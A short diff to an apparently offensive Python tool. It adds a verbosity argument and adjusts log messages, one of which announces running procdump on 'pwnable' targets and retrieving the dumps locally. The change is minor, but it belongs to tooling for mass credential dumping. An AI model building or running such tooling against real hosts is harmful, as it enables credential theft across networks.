@@ -27,7 +27,7 @@ def run(args):
     local_ip = retrieveMyIP()
     alea = gen_random_string(5).upper()
 
-    server = Process(target=launchServer, args=(q, local_ip, alea, args.server))
+    server = Process(target=launchServer, args=(q, local_ip, alea, args.verbosity, args.server))
 
     try:
         targets = listPwnableTargets(args.targets, user)
@@ -37,8 +37,8 @@ def run(args):
             if q.get(True, 3) == -1:
                 pass
         except queue.Empty:
-            logging.info("%sServer launched successfully." % (warningGre))
-            logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s." % (warningGre, green, white))
+            logging.info("%sServer launched successfully." % (infoYellow))
+            logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s..." % (warningGre, green, white))
 
             for target in targets:
                 jobs.append(Process(target=sprayLove, args=(user, target, args.methods, local_ip, alea)))
